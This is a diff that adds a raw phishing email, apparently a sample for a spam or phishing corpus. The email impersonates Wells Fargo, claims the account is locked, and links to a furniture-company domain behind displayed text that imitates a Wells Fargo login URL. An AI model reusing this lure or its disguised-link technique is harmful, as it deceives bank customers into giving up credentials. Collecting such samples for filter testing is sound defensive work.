@@ -1,0 +1,61 @@
+From nobody Sun Jan 25 13:50:02 2015
+Return-Path: <service@wellsfargo.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 81CA246889
+ for <user@login.example.com>; Wed, 21 Mar 2007 20:09:04 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id 864A7131FA98
+ for <user@example.com>; Wed, 21 Mar 2007 20:09:04 -0400 (EDT)
+Received: from pop06.mail.atl.earthlink.net (pop06.mail.atl.earthlink.net
+ [207.69.200.40])
+ by mail.example.org (Postfix) with ESMTP id 8D2516FA1A8
+ for <user@example.com>; Wed, 21 Mar 2007 20:09:04 -0400 (EDT)
+Received: from user-0c9hf2g.cable.mindspring.com ([24.152.188.80] helo=dave)
+ by pop06.mail.atl.earthlink.net with smtp (Exim 3.36 #1)
+ id 1HUAi0-0005pK-00; Wed, 21 Mar 2007 19:59:12 -0400
+From: <service@wellsfargo.com>
+Subject: Your Account Access Is Locked
+Date: Wed, 21 Mar 2007 16:57:31 -0700
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <E1HUAi0-0005pK-00@pop06.mail.atl.earthlink.net>
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 994
+
+<table width="700" cellpadding="0" cellspacing="5">
+  <tr>
+    <td><p align="justify">We  recently reviewed your account, and suspect that your Wells Fargo  Card account may have been accessed by an unauthorized third party.  Protecting the security of your account and of the Wells Fargo  network is our primary concern. Therefore, as a preventative measure,  your profile has been locked due to inactivity or because of too many  failed login attempts.<br />
+        <br />
+        To restore your card account access, please take the following step to ensure that   your account has not been compromised: <br />
+        <br />
+        Validate your Wells Fargo Account Information for any unauthorized withdrawals, and check you account profile to  make sure not changes have been made.<br />
+        <br />
+        To get started, please click the link below:</p>
+    </td>
+  </tr>
+  <tr>
+    <td><a href="http://www.southportfurnitureinc.com/wells.html">https://online.wellsfargo.com/das/cgi-bin2/session.cgi?sessargs</a></td>
+  </tr>
+  <tr>
+    <td><br />
+      We apologize for any inconvenience this may cause, and appreciate your   assistance in helping us maintain the integrity of  the entire Wells Fargo   system. Thank you for attention to this matter.<br />
+      <br />
+      Sincerely,<br />
+      <br />
+      The Wells Fargo Team<br />
+      <br />
+      Please do not reply to this e-mail. Mail sent to this address cannot be   answered. For assistance, log in to your<br />
+      Wells Fargoaccount and choose   the &quot;Help&quot; link in the header of any page.</td>
+  </tr>
+</table>
